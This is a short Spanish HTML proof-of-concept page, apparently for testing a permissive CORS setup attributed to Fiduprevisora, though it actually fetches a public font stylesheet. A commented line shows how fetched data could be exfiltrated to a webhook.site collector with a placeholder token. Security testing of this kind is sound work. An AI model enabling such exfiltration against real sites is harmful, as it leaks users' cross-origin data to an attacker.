<!DOCTYPE html>
<html>
<head>
  <title>PoC - CORS Permisivo - Fiduprevisora</title>
</head>
<body>
  <h2>Probando lectura de recurso con CORS mal configurado</h2>
  <pre id="respuesta">Cargando...</pre>

  <script>
    fetch("https://rsms.me/inter/inter.css")
      .then(res => {
        if (!res.ok) throw new Error("Fallo HTTP");
        return res.text();
      })
      .then(data => {
        document.getElementById("respuesta").textContent = data;
        // También podrías exfiltrar:
        // new Image().src = "https://webhook.site/TU_TOKEN?leak=" + encodeURIComponent(data);
      })
      .catch(err => {
        document.getElementById("respuesta").textContent = "Error: " + err.message;
      });
  </script>
</body>
</html>
